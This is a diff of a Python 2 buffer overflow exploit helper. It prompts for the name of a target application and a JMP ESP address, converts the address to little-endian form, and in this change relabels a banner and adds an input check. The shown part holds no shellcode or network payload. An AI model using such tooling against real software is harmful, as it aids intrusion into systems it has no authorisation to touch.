@@ -30,7 +30,7 @@ class SERVER_BUFFER():
              global P
              global Y            
              time.sleep(2)
-             print O+"\n[A]"+W+R+" THE BUFFER_HELPER ACK AS FTP_SERVER "+W+O+"[C]"+W  
+             print O+"\n[A]"+W+R+" Buffer helper Start Target FTP Client mode  "+W+O+"[C]"+W  
              time.sleep(2)
              self.app_name = str(raw_input(O+"\n[?]"+W+B+" Enter The Application Name you Try Exploit : "+W))         
              self.string_ramd() 
@@ -151,23 +151,28 @@ class SERVER_BUFFER():
                        exit() 
                    
       def little_endian(self):
-         
                try:
                     jump= str(raw_input(O+"\n[+]"+W+B+" Enter JMP ESP addrsss HEX  : "+W)).upper()
+                    if len(jump) < 4 :
+                        print Y+"\n[(*)]"+W+R+"JMP ESP is Required "+W+Y+"[(*)] "+W  
+	                return self.little_endian()  
+	            else:
+	               pass             
+                    time.sleep(2)
                     self.jump_address = "".join(reversed([jump[i:i+2] for i in range(0, len(jump), 2)]))
                     self.display =self.jump_address# for print olnly
                     self.display = " ".join('\\x%s'%self.display[i:i+2] for i in range(0, len(self.display), 2))
                     self.display= self.display.replace(" ", "")
                     time.sleep(2)
                     self.jump_address = ('0'*(len(self.jump_address) % 2) +self.jump_address).decode('hex') 
-                    time.sleep(2)
                     print Y+"\n[+]"+W+P+"little endian JMP ESP  is "+W+B+": "+W,R+self.display+W
                except Exception:
 	               print Y+"\n[(*)]"+W+R+"TypeError: Non-hexadecimal digit found "+W+Y+"[(*)] "+W  
 	               return self.little_endian()                       
                except KeyboardInterrupt:
                     print  Banner
-                    exit()    
+                    exit()
+                              
       def attack(self):
             
 	     try:
@@ -238,6 +243,3 @@ class SERVER_BUFFER():
                        
 if __name__ == '__main__': 
   SERVER_BUFFER()
-
-
-
